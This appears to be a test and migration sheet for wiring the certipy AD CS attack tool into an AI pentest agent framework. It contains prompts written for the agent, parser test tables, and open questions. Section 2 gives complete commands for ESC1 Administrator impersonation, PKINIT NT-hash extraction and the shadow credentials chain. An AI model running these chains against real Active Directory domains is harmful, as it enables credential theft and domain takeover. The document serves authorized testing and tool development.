# certipy — Tier A scenarios

Single test sheet for the `certipy` tool migration (Wave 4.2 — second tool of
Wave 4, AD post-exploitation cluster, **largest non-impacket migration** at
2546 LOC mcp-server.py).

certipy is `certipy-ad` (PyPI: `certipy-ad`, CLI: `certipy`) — a **single
binary** with **sub-command architecture**: `certipy <subcommand> [options]`.
11 subcommands total: `find / req / auth / shadow / forge / template / ca /
account / cert / parse / ptt / relay`. The legacy MCP server exposes 10 of
them as methods (relay omitted — interactive long-running).

Structurally similar to netexec (Wave 4.1) — single binary with sub-commands
selected by first positional. **Critically different from netexec**: certipy
has NO positional target. The DC is always `-dc-ip` (flag), the operation
target is `-target` (flag). Sub-commands like `find`, `req`, `auth` take
ONLY flags after the sub-command token. A few sub-commands (`shadow`,
`account`, `parse`) take a SECOND POSITIONAL (action token / input file)
which is also never a target.

Sections:
1. Recommended HTB box for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20 — total 24)
4. Failure-signature live-verify cases (≥3 — total 6)
5. Open questions
6. Hand-off

---

## 1. Recommended HTB box

**No canonical HTB box for certipy live-verify.** AD CS requires a Windows
DC with the Certificate Services role installed (`certsrv.msc`). Most HTB
AD boxes are Linux DCs (Samba) which DO NOT host AD CS. The canonical
certipy test environment is a self-built Windows AD lab with AD CS.

**Boxes that historically had AD CS configured (verify availability):**
- **Hercules (10.129.242.196)** — listed in registry but NTLM-disabled
  Linux DC; verify whether AD CS was added. If not, `find` will fail with
  "Could not find any CA". Open question — need live confirmation.
- **Pirate** — Windows DC per the trajectory analysis
  (memory/pirate-htb-insights.md), AD CS not confirmed.
- **Outdated, Authority, Escape, Sizzle, Forest, Querier** — historical
  HTB AD CS boxes (some retired). Authority and Escape are the canonical
  ESC1/ESC4 demo boxes.

**Documented gap (Open Question 6)**: certipy live-verify against HTB
requires either rebuilding an AD CS lab at Pirate's IP or pivoting to a
self-hosted Windows DC. For this migration, target_extraction and
failure_signatures are verified via plugin unit tests and command-shape
audits; runtime behaviour is verified against any reachable AD CS lab
post-pilot.

**Persistent test directory**: mount `/tmp/certipy-test:/session` (per
SKILL #14). Multi-step flows like find → req → auth need the same
working dir across calls so the PFX from `req` is visible to `auth`.

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — find vulnerable templates (ESC1-ESC16 enumeration)

```
Engagement target: <DC IP> with AD CS installed (authorized AD lab).
Use certipy find -username auditor@corp.local -password 'P@ss123' -dc-ip <DC IP> -vulnerable -stdout to enumerate AD Certificate Services and filter to only templates with ESC1-ESC16 vulnerabilities. Capture the CA name and any vulnerable templates.
```

**Watch:** target=`<DC IP>` extracted via flag_value rule 3 (-dc-ip). The
sub-command `find` is the FIRST positional and is correctly NOT extracted.
The UPN `auditor@corp.local` is `-username` value; despite being FQDN-shape,
it's consumed atomically by the value_flag and doesn't pollute target
extraction.

### S2 — find with persistent JSON+text output

```
Engagement target: <DC IP> with AD CS (authorized AD lab).
Use certipy find -username auditor@corp.local -password 'P@ss123' -dc-ip <DC IP> -json -text -output /session/certipy-find to write JSON + TXT enumeration files for downstream analysis.
```

**Watch:** target=`<DC IP>`. Output files: `/session/certipy-find_*.json`
(machine-parseable) and `/session/certipy-find_*.txt` (human summary).
Files persist across container restarts because /session is bind-mounted.

### S3 — request a certificate (ESC1: impersonate Administrator)

```
Engagement target: <DC IP> + <CA name> known from S1 (authorized AD lab).
Use certipy req -username auditor@corp.local -password 'P@ss123' -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local -dc-ip <DC IP> -out /session/admin-cert to exploit ESC1 by requesting a certificate with administrator's UPN injected into the SAN.
```

**Watch:** target=`<DC IP>`. Output PFX lands at `/session/admin-cert.pfx`.
The `-upn administrator@corp.local` value is FQDN-shape but consumed by
value_flag. NOTE: certipy req may PROMPT on denial — if the request
fails, expect a "Would you like to save the private key? (y/N):" prompt
that hangs in cli_in_container. WORKAROUND: wrap with `bash -c "yes |
certipy req ..."` for ESC7 SubCA flow.

### S4 — auth with PFX (PKINIT to extract NT hash)

```
Engagement target: <DC IP> with AD CS (authorized AD lab).
After S3 produces /session/admin-cert.pfx, use certipy auth -pfx /session/admin-cert.pfx -pfx-pass '' -dc-ip <DC IP> to authenticate via Kerberos PKINIT and extract the target's NT hash via U2U.
```

**Watch:** target=`<DC IP>`. Output: NT hash (printable in stdout) and a
.ccache file in /session/. Empty `-pfx-pass ''` MUST be quoted to preserve
the empty string through the shell. The PFX path `/session/admin-cert.pfx`
is `-pfx` value; the dot in the filename is irrelevant because flag_value
extraction wins over any positional shape match.

### S5 — shadow credentials full chain (auto)

```
Engagement target: <DC IP> with AD CS (authorized AD lab). Attacker has GenericWrite on victim's msDS-KeyCredentialLink.
Use certipy shadow auto -username attacker@corp.local -password 'P@ss123' -account victim -dc-ip <DC IP> to perform the full Shadow Credentials chain: add key cred, PKINIT auth, extract NT hash, remove key cred.
```

**Watch:** target=`<DC IP>`. The `auto` token is the SECOND POSITIONAL
after `shadow` — it's the action selector, NOT a target. flag_value
extraction correctly skips it. Final output: victim's NT hash +
`/session/<random>_victim.pfx`.

### S6 — pass-the-ticket from a captured ccache

```
Engagement target: <DC IP> (authorized AD lab).
After producing /session/admin-cert.pfx via req or forge, use certipy ptt -pfx /session/admin-cert.pfx -no-save to convert the PFX into a usable Kerberos ticket without writing the ccache to disk.
```

**Watch:** target=null (no -target / -dc-ip is required for ptt — it's a
local conversion). Plugin's scope validation will flag this if mandatory
target is enforced; ptt is a local op and should be allowed without scope
check. Document as Open Question 5.

### S7 — parse PFX (offline, no network)

```
Engagement target: NONE — offline operation.
Use certipy parse /session/admin-cert.pfx to inspect a PFX file's contents (subject, SANs, EKU, validity period) without contacting any DC.
```

**Watch:** target=null (no -dc-ip, no -target). The positional
`/session/admin-cert.pfx` is a FILE PATH, not a target — the DSL's
flag_value-only target extraction correctly returns null. Plugin's scope
validation should permit offline ops without target — Open Question 5.

### S8 — failure: wrong template name

```
Engagement target: <DC IP> with AD CS (authorized AD lab).
Use certipy req -username auditor@corp.local -password 'P@ss123' -ca CORP-CA -template DoesNotExist -dc-ip <DC IP> to deliberately reference a non-existent template.
```

**Watch:** Output contains `CERTSRV_E_UNSUPPORTED_CERT_TYPE`. Failure
classified via that signal. Distinct from CERTSRV_E_TEMPLATE_DENIED
(permission) — this is "template not found / not published on CA". Agent
remediation: re-run `find` to verify the template name is correct
(CASE-SENSITIVE) and is published on the chosen CA.

---

## 3. Target-extraction adversarial cases (24 total, ≥20 spec)

The certipy `tool.yaml` declares FOUR `target_extraction` rules (first
match wins, all `flag_value` — NO positional rules):

1. `flag_value` for `-target` (parse_as: raw) — the operation target
   (CA server, ldap server). Most explicit; wins when set.
2. `flag_value` for `-target-ip` (parse_as: raw) — numeric override.
3. `flag_value` for `-dc-ip` (parse_as: raw) — DC IP, always present in
   DC-bound operations. Fallback when -target/-target-ip absent.
4. `flag_value` for `-dc-host` (parse_as: raw) — DC FQDN, used for
   Kerberos SPN resolution. Last fallback.

NO `positional_match` rule. Sub-commands (`find`, `req`, etc.) are the
first positional and must NEVER be picked as targets. Some sub-commands
take a second positional (`shadow auto`, `account delete`, `parse <file>`)
which is also not a target.

`value_flags` declares ~95 entries to prevent value-position strings
(passwords, hashes, UPNs, SIDs, DNs, file paths, OIDs, request IDs) from
being mistaken for targets — every flag whose value could shape-match a
host is enumerated.

### Happy-path cases — flag_value extraction

| #  | Command (binary `certipy` omitted) | Expected target | Notes |
|----|---|---|---|
| 1  | `find -username u@d.local -password p -dc-ip 10.10.10.5 -vulnerable -stdout` | `10.10.10.5` | find / dc-ip basic (rule 3) |
| 2  | `find -username u@d.local -password p -dc-ip 10.10.10.5 -output /session/find` | `10.10.10.5` | find / dc-ip + -output value `/session/find` (NOT target) |
| 3  | `req -username u@d.local -password p -ca CORP-CA -template T -upn admin@d.local -dc-ip 10.10.10.5 -out /session/c` | `10.10.10.5` | req / dc-ip; -upn admin@d.local is value, NOT target |
| 4  | `auth -pfx /session/admin.pfx -pfx-pass '' -dc-ip 10.10.10.5` | `10.10.10.5` | auth / dc-ip; empty -pfx-pass `''`; pfx path is value |
| 5  | `shadow auto -username att@d.local -password p -account victim -dc-ip 10.10.10.5` | `10.10.10.5` | shadow + positional `auto` action; -dc-ip wins |
| 6  | `ca -username u@d.local -password p -ca CORP-CA -enable-template SubCA -dc-ip 10.10.10.5` | `10.10.10.5` | ca / dc-ip; -enable-template value is template name (not target shape anyway) |
| 7  | `find -username u@d.local -password p -dc-ip 10.10.10.5 -dc-host DC01.corp.local` | `10.10.10.5` | -dc-ip wins over -dc-host (rule 3 before rule 4) |
| 8  | `find -username u@d.local -password p -dc-ip 10.10.10.5 -target DC01.corp.local` | `DC01.corp.local` | -target (rule 1) wins over -dc-ip (rule 3) |
| 9  | `find -username u@d.local -password p -dc-ip 10.10.10.5 -target-ip 10.10.10.6 -target DC01.corp.local` | `DC01.corp.local` | -target rule 1 wins over -target-ip rule 2 wins over -dc-ip rule 3 |
| 10 | `forge -ca-pfx /session/CA.pfx -upn admin@d.local -out /session/g` | `null` | forge is OFFLINE — no DC required. -upn FQDN-value MUST NOT be picked. |

### Adversarial — value-flag traps (FQDN/IP-shape values that could be picked)

| #  | Command | Expected | Notes |
|----|---|---|---|
| 11 | `find -username admin@corp.local -password p -dc-ip 10.10.10.5` | `10.10.10.5` | UPN admin@corp.local is FQDN-shape; -username is value_flag, consumed atomically |
| 12 | `req -username u@d.local -password p -ca CORP-CA -template T -upn target@victim.com -dc-ip 10.10.10.5 -out /session/c` | `10.10.10.5` | -upn value `target@victim.com` is FQDN-shape; in value_flags |
| 13 | `req -username u@d.local -password p -ca CORP-CA -template T -dns dc01.corp.local -dc-ip 10.10.10.5 -out /session/c` | `10.10.10.5` | -dns value `dc01.corp.local` is FQDN-shape; in value_flags |
| 14 | `req -username u@d.local -password p -ca CORP-CA -template T -on-behalf-of CORP\\\\Administrator -dc-ip 10.10.10.5 -out /session/c` | `10.10.10.5` | -on-behalf-of value `CORP\Administrator` (DOMAIN\user); in value_flags |
| 15 | `find -username u@d.local -password p -dc-ip 10.10.10.5 -sid S-1-5-21-1234-5678-9012-500` | `10.10.10.5` | -sid value (SID); -sid in value_flags |
| 16 | `auth -pfx /session/admin.pfx -pfx-pass '' -dc-ip 10.10.10.5 -ns 8.8.8.8` | `10.10.10.5` | -ns value `8.8.8.8` is IP-shape; in value_flags. -dc-ip wins because -dc-ip rule comes first. |
| 17 | `find -username u@d.local -password p -dc-ip 10.10.10.5 -ca-pfx /session/CA.pfx` | `10.10.10.5` | hypothetical mixed case; -ca-pfx value is file path |
| 18 | `parse /session/dump.bof -domain corp.local -ca-name CORP-CA` | `null` | parse is OFFLINE — file path positional, no -dc-ip. -domain value `corp.local` is FQDN-shape but in value_flags. |

### Adversarial — security invariants & ambiguity

| #  | Command | Expected | Notes |
|----|---|---|---|
| F1 | `--help` | `target=null` | Top-level help. Tool runner bypasses scope. |
| F2 | `-h` | `target=null` | Short alias. |
| F3 | `find --help` | `target=null` | Per-subcommand help. |
| F4 | `req --help` | `target=null` | Per-subcommand help. |
| F5 | `find -username u@d.local -password p` | `target=null` | Missing -dc-ip — argparse will reject before scope check, but extraction returns null which is correct. |
| F6 | `cert -pfx /session/admin.pfx -out /session/cert.pem` | `target=null` | cert subcommand is OFFLINE — no -dc-ip / -target. Plugin scope validation should permit offline ops. Open Question 5. |
| F7 | `parse /session/dump.bof` | `target=null` | parse subcommand is OFFLINE — positional file path is NOT a target. |
| F8 | `ptt -pfx /session/admin.pfx -no-save` | `target=null` | ptt subcommand is LOCAL — no -dc-ip required. |
| F9 | `find -username u@d.local -password p -dc-ip 10.10.10.5 -dc-host DC01.corp.local -target CA01.corp.local` | `CA01.corp.local` | All three present; -target rule 1 wins. **Security invariant**: -dc-ip and -dc-host are auth/SPN resolution; -target is the operational target. |

(Total: 24 cases, ≥20 spec.)

---

## 4. Failure-signature live-verify cases (6 total, ≥3 spec)

Verify against the certipy container (rebuild during Wave 9 batch with
mcp-common 0.3.0 and python3-full base — Dockerfile fix landed today).

Layer diversity (SKILL #11) — 7 distinct verifiable layers represented in
`tool.yaml`'s `failure_signatures`. Live-verify the most common 6 below.

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | DNS | `certipy find -username u@d.local -password p -dc-ip nonexistent.invalid` | `Could not resolve` OR `Temporary failure in name resolution` | PENDING live verify (Wave 9) |
| 2 | TCP | `certipy find -username u@d.local -password p -dc-ip 127.0.0.1 -port 1` (closed port) | `Connection refused` OR `socket connection error` | PENDING live verify |
| 3 | Auth / NTLM | `certipy find -username nonexistent@d.local -password wrong -dc-ip <DC IP>` | `STATUS_LOGON_FAILURE` OR `LDAP NTLM authentication failed` | PENDING live verify (needs AD CS lab) |
| 4 | Kerberos preauth | `certipy find -username u@d.local -password wrong -dc-ip <DC IP> -k` (with valid ccache for different user) | `KDC_ERR_PREAUTH_FAILED` | PENDING live verify |
| 5 | AD CS / CERTSRV | `certipy req -username u@d.local -password p -ca CORP-CA -template DoesNotExist -dc-ip <DC IP>` | `CERTSRV_E_UNSUPPORTED_CERT_TYPE` | PENDING live verify (needs AD CS lab) |
| 6 | argparse | `certipy find -username u@d.local -password p -dc-ip 10.10.10.5 --vulnerable` (DOUBLE DASH — wrong) | `error: unrecognized arguments` | PENDING live verify |

### Layer diversity (SKILL #11) — achieved

7 distinct verifiable layers documented in `failure_signatures`:
1. **DNS** (case 1)
2. **TCP** (case 2)
3. **Auth / NTLM** (case 3 — STATUS_LOGON_FAILURE; LDAP NTLM authentication failed)
4. **Kerberos** (case 4 — preauth; service-principal-unknown also encoded)
5. **AD CS / certsrv** (case 5 — CERTSRV_E_TEMPLATE_DENIED, CERTSRV_E_UNSUPPORTED_CERT_TYPE,
   CERTSRV_E_RESTRICTEDOFFICER, "Failed to request certificate")
6. **RPC / DCERPC** (rpc_s_access_denied; RPC_E_CALL_COMPLETE; "Failed to get DCE RPC connection";
   "Failed to connect to Service Control Manager" — encoded for live-verify on `ca -backup`)
7. **argparse** (case 6 — argument validation, "the following arguments are required",
   "unrecognized arguments", "invalid choice")

Plus shadow-specific: "Could not update Key Credentials" / "insufficient access rights"
encoded for shadow attack failures when attacker lacks write on msDS-KeyCredentialLink.

### Signals encoded but not yet live-verified

`STATUS_ACCESS_DENIED`, `KDC_ERR_S_PRINCIPAL_UNKNOWN`,
`KDC_ERR_C_PRINCIPAL_UNKNOWN`, `KRB_AP_ERR_SKEW`, `Kerberos
authentication failed`, `CERTSRV_E_TEMPLATE_DENIED`,
`CERTSRV_E_RESTRICTEDOFFICER`, `Failed to request certificate`, `Could
not update Key Credentials`, `insufficient access rights`,
`rpc_s_access_denied`, `RPC_E_CALL_COMPLETE`, `Failed to connect to
Service Control Manager`, `Username or domain is not specified`,
`Certificate is not valid for client authentication`, `the following
arguments are required`, `invalid choice`.

These exercise post-pilot when a working AD CS lab is available.

---

## 5. Open questions

1. **`req` interactive prompt handling (yes | workaround)** — certipy's
   `req` prompts "Would you like to save the private key? (y/N):" when a
   request is denied (ESC7 SubCA flow). The legacy mcp-server.py wraps
   the call with `bash -c "yes | certipy req ..."` to auto-confirm. The
   kind:cli path does NOT pipe `yes` automatically — when the request is
   denied, certipy hangs on stdin EOF. **WORKAROUND**: agent invokes
   certipy via `bash -c "yes | certipy req ..."` explicitly when a
   denial is expected. Document in gotchas — done. Long-term: consider a
   `pre_invocation_pipe` plugin DSL feature so tool.yaml can declare
   `pipe_yes_for: ["req", "account delete"]` and the runner handles it.

2. **`account delete` interactive confirmation** — same root as Open
   Question 1. Legacy mcp-server.py wraps with `yes |` (line 2326).
   Same workaround applies.

3. **Recipe system retirement** — the original mcp-server.py loads
   dynamic recipes from `/session/tool_recipes/certipy/` (Feature 28).
   With kind:cli, the LLM writes argv directly and recipes are dead code
   under the run_cli path. Recipes still load for legacy method calls
   if the directory exists. Per REQ-TR-016, this is RETIRED for
   kind:cli. Document in tool.yaml gotchas — done.

4. **target_extraction with sub-command + dc-ip fallback** — the DSL
   evaluates flag_value rules in declared order; first match wins.
   Verified that -target wins over -target-ip wins over -dc-ip wins
   over -dc-host. **Caveat**: when a sub-command takes a second
   positional (like `shadow auto`, `account delete`, `parse <file>`),
   the DSL's flag_value-only extraction correctly avoids these
   positionals (none are targets). Sub-command is always positional 1.

5. **Offline subcommand scope handling** — `cert`, `parse`, `forge`,
   `ptt` do NOT require -dc-ip and operate on local files only. Plugin
   scope validation should PERMIT these without target — but currently
   target_extraction returns null and scope validation may flag it. **Open
   for plugin DSL Phase 2**: add a per-subcommand `requires_target`
   override (e.g., `subcommand_target_required: {find: true, req: true,
   parse: false}`). Until then, agents invoking offline subcommands
   bypass scope check via the runner's no-target permission path.

6. **AD CS lab availability for live verify** — no canonical HTB box
   currently has AD CS configured. Self-hosted Windows AD CS lab needed
   for full live-verify of failure_signatures and runtime behaviour.
   Documented as known gap. For this migration, target_extraction and
   command-shape validation are done via plugin unit tests; runtime
   behaviour is verified post-pilot when an AD CS environment is
   reachable.

7. **Output file naming conventions** — certipy writes to CWD (which is
   `/app` inside the container WHEN kind:cli is invoked, or
   `/session/certipy/` WHEN the legacy mcp-server.py method is invoked
   via _ensure_work_dir). Agents using kind:cli MUST pin output paths
   with `-output /session/<prefix>` or `-out /session/<name>` for
   persistent capture. Documented in gotchas — done. Long-term: consider
   wrapping kind:cli runs in a `cd /session && certipy ...` shell
   invocation so the default output location is /session/.

8. **`-pfx-pass ''` empty-string handling** — for certipy-generated
   PFXes (no password), `-pfx-pass ''` MUST be quoted to preserve the
   empty string through the shell. cli_in_container's argv construction
   should preserve empty-string args correctly; verify in plugin unit
   tests. Documented in gotchas — done.

9. **Per-subcommand `-no-save` semantics** — `auth -no-save` skips
   ccache writing; `template -no-save` skips backup before modification.
   Two different semantics for the same flag name. Documented per
   subcommand in common_options. Agents reading tool.yaml's
   common_options should pick the right semantic from the subcommand
   context.

10. **Kerberos clock skew on kind:cli** — certipy's Dockerfile retains
    `libfaketime` and the entrypoint.sh wires FAKETIME from
    clock_offset. Kerberos clock skew is the #1 failure mode on hardened
    AD targets. Verify libfaketime survives the Dockerfile fix
    (python3-pip / python3-venv → python3-full) — should, since
    libfaketime is a separate apt package. (Same as netexec Open
    Question 10.)

11. **Audit gap: `_ensure_krb5_conf` auto-generation lost under
    kind:cli** — legacy mcp-server.py auto-writes `/etc/krb5.conf` from
    `user@domain` whenever Kerberos auth is requested (lines 319-352
    `_ensure_krb5_conf` + line 290 fallback `shutil.copy` from
    `/session/config/krb5.conf` on container start). Under kind:cli's
    `run_cli` path, the binary inherits a NAKED container with no
    krb5.conf, and any `-k` invocation will fail at the realm-resolution
    layer. Workaround documented in gotchas (write krb5.conf via
    `bash -c`). **Plugin/runner work needed**: a `kerberos_conf_from`
    DSL hook in tool.yaml that auto-generates `/etc/krb5.conf` from
    `-username`'s `@domain` suffix when `-k` is present, OR a generic
    pre-invocation hook framework. Until then, agents MUST hand-roll the
    krb5.conf for every Kerberos call — high friction.

12. **Audit gap: `KRB5CCNAME` env injection lost under kind:cli** —
    legacy `_get_auth_env` (line 307) injects `{KRB5CCNAME: <path>}`
    into the subprocess env when `kerberos=true` and a `ccache_path` is
    supplied (or the active principal has a saved ticket). `run_cli`
    does NOT accept an env override and does NOT inspect prior call
    state. Workaround: `bash -c "KRB5CCNAME=/session/credentials/...
    certipy ... -k"`. **Plugin/runner work needed**: an `env_from_args`
    DSL feature, or a session-wide credential map that the runner
    consults to populate KRB5CCNAME automatically when `-k` is used.

13. **Audit gap: `auth` overwrite-prompt protection lost** — legacy
    `authenticate` handler backs up existing `*.ccache`/`*.kirbi` in
    `/session/certipy/` before invoking `certipy auth` (lines 1706-1712)
    and restores them in `finally` (lines 1803-1812), then renames the
    new files with a unique prefix (lines 1745-1755). Without this
    dance, certipy's "Overwrite? (y/n)" prompt EOFs on stdin and the
    process aborts before producing the NT hash. Under kind:cli the
    agent must either (a) invoke from a guaranteed-empty CWD, (b)
    pre-clean stale files, or (c) rely on the per-tool wrapper
    workaround (proposed Open Question 1) to pipe `yes`. **Plugin/runner
    work needed**: per-method `pre_invocation_cleanup_glob` DSL feature,
    or extend the `pipe_yes_for` proposal to cover this case.

14. **Audit gap: `req -retrieve` ESC7 key-symlink trick lost** —
    legacy `request` handler (lines 1559-1571) handles the ESC7
    multi-step flow where a denied request saves a private key under
    one filename, but the `-retrieve` step expects the key at
    `<request_id>.key`. Legacy searches `WORK_DIR` for the most-recent
    `*.key` and symlinks it as `<request_id>.key` so certipy can
    combine cert + key into a PFX. Under kind:cli, agents must
    explicitly `bash -c "ln -sf <orig.key> <request_id>.key"` between
    the `ca -issue-request` and `req -retrieve` calls. Otherwise the
    retrieve step succeeds but the resulting PFX has no usable private
    key. Documented in gotchas — but this multi-step orchestration is a
    real friction point. **Plugin/runner work needed**: ESC7 is
    multi-call by nature; consider a per-tool stateful "session" that
    persists file paths across kind:cli calls, or document the explicit
    bash-wrapping recipe in the agent's pentest prompt.

15. **Audit gap: per-method default flags (`-json -text -output`,
    `-force -no-save`) not auto-injected** — legacy handlers add
    `-json -text -output <prefix>` unconditionally for `find` (line
    1407) and `parse` (line 2481), and `-force -no-save` for `template
    write_default`/`write_config` (lines 2067-2068, 2071-2072). kind:cli
    has no method-level default-flag injection — agents must remember
    each. Documented in gotchas. **Plugin/runner work needed**: a
    `subcommand_default_flags` DSL feature, e.g.,
    `find: ["-json", "-text"]`, that the runner appends if not already
    present in argv.

16. **Audit gap: `template` `read` action has no native flag** —
    legacy maps `action=read` to `-save-configuration <prefix>.json`
    (line 2057) because `certipy template` produces no output without
    one of the action flags. Under kind:cli, naked `certipy template
    -template T -username u -dc-ip ip` is silent. Documented in
    gotchas. Not blocking — agents reading the gotchas will learn to
    pass `-save-configuration` for inspection.

---

## 6. Hand-off

- **Tool**: certipy (kind:cli, single binary `certipy`, pip
  `certipy-ad`). Sub-command architecture: `certipy <subcommand>
  [options]` over 11 subcommands (find / req / auth / shadow / forge /
  template / ca / account / cert / parse / ptt / relay).
- **Status**: tool.yaml authored end-to-end (kind:mcp methods PRESERVED
  + kind:cli sections ADDED on top); scenarios.md written. **Dockerfile
  EDITED** — `python3 / python3-pip / python3-venv` replaced with
  `python3-full` (Kali-rolling-friendly per nikto / impacket / ffuf /
  nuclei / git-dumper / ssti / netexec convention). libfaketime
  retained (Kerberos clock-skew defence — certipy needs it as much as
  netexec because every certipy operation goes through Kerberos PKINIT
  or Kerberos auth).
- **mcp-server.py UNTOUCHED** — auto-inherits `run_cli` from
  BaseMCPServer (mcp-common 0.3.0); existing 10 method handlers
  (find/request/authenticate/shadow/forge/template/ca/account/cert/parse)
  preserved as the legacy / rollback path per SKILL #21. The methods
  carry rich error classification (auth vs permission vs config vs
  network — see _classify_certipy_error, ~150 LOC) that's NOT
  reconstructible from raw stdout. Agents that want classified errors
  still call `mcp_tool certipy find` rather than `cli_in_container
  certipy find ...`. Both paths coexist.
- **Image**: `ghcr.io/silicon-works/mcp-tools-certipy:latest` — needs
  rebuild during Wave 9 batch to pick up mcp-common 0.3.0 AND the
  python3-full base. Image size unchanged (~721 MB).
- **target_extraction = FOUR rules**: ALL `flag_value`. Rule 1
  `-target`. Rule 2 `-target-ip`. Rule 3 `-dc-ip`. Rule 4 `-dc-host`.
  NO `positional_match` — sub-commands are positional 1 (never a
  target); some sub-commands take second positional action / file
  (also never a target). Offline sub-commands (cert, parse, forge,
  ptt) return null target — Open Question 5.
- **value_flags**: ~95 entries — every auth flag (-username/-password/
  -hashes/-aes/-k/-no-pass/-d/-domain), every targeting flag
  (-target/-target-ip/-dc-ip/-dc-host/-ns/-dns-tcp/-port/-scheme/
  -timeout), every find flag (-output/-stdout/-vulnerable/-enabled/
  -bloodhound/-text/-json/-dc-only/-sid/-oids), every req flag
  (-ca/-template/-upn/-dns/-on-behalf-of/-pfx/-renew/-archive-key/
  -retrieve/-web/-dcom/-application-policies/-key-size/-pfx-pass/
  -pfx-password/-out/-subject), every auth flag (-cert/-key/-no-save/
  -print/-kirbi/-no-hash/-ldap-shell), every forge flag (-ca-pfx/
  -ca-password/-validity-period/-issuer/-crl/-serial), every shadow
  flag (-account/-device-id), every ca flag (-enable-template/
  -disable-template/-issue-request/-deny-request/-add-officer/
  -remove-officer/-config/-list-templates/-backup), every account
  flag (-user/-group/-sam/-spns/-pass), every template flag
  (-save-configuration/-write-configuration/
  -write-default-configuration/-force), every cert flag (-export/
  -export-password/-nocert/-nokey), and every parse flag (-format/
  -sids/-published/-hide-admins).
- **reject_flags**: EMPTY — certipy has no bulk-target ingest flag.
  The `parse` subcommand takes a local file path positional but is
  OFFLINE (no network), so no scope risk. Documented in
  reject_flags_reason.
- **allow_multi_target: false** — certipy targets a single DC/CA per
  call. No CIDR support. (Different from netexec where CIDR is
  idiomatic.)
- **Wave 4.2**: second tool of Wave 4 (AD post-exploitation cluster).
  Tier A migration progress: 16 tools done after this (curl, sqlmap,
  impacket, nmap, ffuf, nuclei, nikto, john, hashcat, kerbrute, hydra,
  ssti, git-dumper, netexec, certipy). Wave 4 continues
  with bloodyad / pygpoabuse.
- **Single-dash long flags throughout (SKILL #5)** — verified against
  mcp-server.py's _build_auth_args (line 410): `-username`, `-password`,
  `-hashes`, `-k`, `-aes` (NOT `-aesKey`), `-ns`, `-dns-tcp`, `-target`,
  `-dc-host`, `-dc-ip`, `-no-pass`. Per-handler argv construction
  matches: `-ca`, `-template`, `-upn`, `-dns`, `-sid`, `-on-behalf-of`,
  `-pfx`, `-retrieve`, `-key-size`, `-web`, `-application-policies`,
  `-dcom`, `-subject`, `-pfx-password`, `-renew`. This is the #1 most
  important fact for agents to internalize — NOT `--username`.
- **Files removed**: `__pycache__/` (build artefact, not in git but
  present on disk — removed). NO `target_extraction_tests.md` and NO
  `failure_signature_tests.md` ever existed for certipy — directory
  was already on the simpler layout.
- **Live-verify pending**: paste S1-S8 against an AD CS lab (TBD —
  open question 6) during Wave 9 batch rebuild + e2e run. Verify
  failure signatures 1-6 live; verify target-extraction cases 1-18 +
  F1-F9 with plugin unit tests (no AD CS lab needed for
  target_extraction unit tests — pure command-shape parsing).

Authored: 2026-04-25 (Wave 4.2).
